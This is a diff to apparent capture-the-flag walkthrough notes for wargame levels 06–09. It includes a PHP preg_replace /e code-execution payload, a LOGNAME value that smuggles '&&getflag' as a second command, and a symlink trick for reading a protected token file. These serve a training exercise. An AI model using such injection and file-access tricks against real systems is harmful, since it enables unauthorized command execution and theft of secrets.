@@ -54,4 +54,22 @@ from /usr/sbin:
 
 PHP syntax : https://www.php.net/manual/en/language.types.string.php
 
+`Example of the PHP function on level06
+$string = "[x echo \"Hello, world!\"]";
+$result = preg_replace('/(\[x (.\*)\])/e', "$2", $string);
+echo $result; // Output: Hello, world!`
+
 `echo '[x {${`getflag`}}]' > /tmp/getflag`
+
+## level 07
+
+export LOGNAME="&&getflag"
+
+## level 08
+
+`ln -s /home/user/level08/token /tmp/level08flag`
+
+## level 09
+
+Write a decode file in c.
+`cat token | xargs /tmp/decode`
